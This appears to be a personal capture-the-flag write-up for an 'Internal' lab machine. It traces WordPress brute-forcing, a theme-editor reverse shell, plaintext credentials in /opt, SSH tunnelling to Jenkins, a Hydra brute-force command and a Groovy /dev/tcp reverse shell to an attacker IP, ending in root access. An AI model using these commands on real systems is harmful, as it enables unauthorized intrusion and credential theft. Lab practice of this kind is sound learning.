the **“401-Unauthorized”** status code tells us that we need to authenticate (for example by using our credentials) to get the requested response whereas the **“403-Forbidden”** simply tells us that we don’t have the permission to see the requested resource whether we are authenticated or not.


Initial scans showed only ports 22 and 80 open
dirbuster showed the presense of /blog page
ran wpscan and dirb on /blog /phpmyadmin
wpscan revealed the admin user and dirb showed some /blog/wp-login.php
wpscan rockyou txt to bruteforce the admin's password gave my2boys as pass
logged in, in appearances -> theme editor, replacedd the 404.php to give me reverse shell
Got shell as www-data!
go to /var/www/html and always check
There should e a .config file, usually with passwords, but NOT THIS TIME
Got passwords to a mysql database, where the admin password was hashed, but we already had it, so no use.
also ALWAYS CHECK /opt. it is supposed to be usually empty.
But this time, abreanna's password was there in plaintext.
su abreanna , pass
again, /opt had a jenkins.txt, which showed a dev jenkins running inside their private netwrk
This means tunnelling.
ssh username@ip_target -L 8000:172.17.0.1:8080 --did not work
```
ssh -L 1234:172.17.0.2:8080 aubreanna@internal.thm
```
^this worked.
now, http://localhost:1234 was hosting a jenkins login page.
defaultcreds dint work, so had to resort to bruteforce using hydra.
```zsh
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 1234 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```
Here, localhost:1234 is tunneled from internal.thm's private network's 8080 port. 
was where the post request was sent to
and between 2 colons, is the body part of the req.
after the colon, error message

Got the password to be spongebob!
logged in, and we can either follow Alfred's methodology where we create a new build and run
OR
by going to **Manage Jenkins** **->** **Script Console** and writing a Groovy script.
Since Groovy is basically Java, we copied this script
```groovy
`r = Runtime.getRuntime()`

`p = r.exec([``"/bin/bash"``,``"-c"``,``"exec 5<>/dev/tcp/10.17.34.38/1236;cat <&5 | while read line; do \$line 2>&5 >&5; done"``] as String[])`

`p.waitFor()`
```
And that gave us another shell, for user "jenkins"
yet again in /opt, there was a note.txt, which had root password in plaintext
`ssh root@internal.thm` - pass
gave the root shell!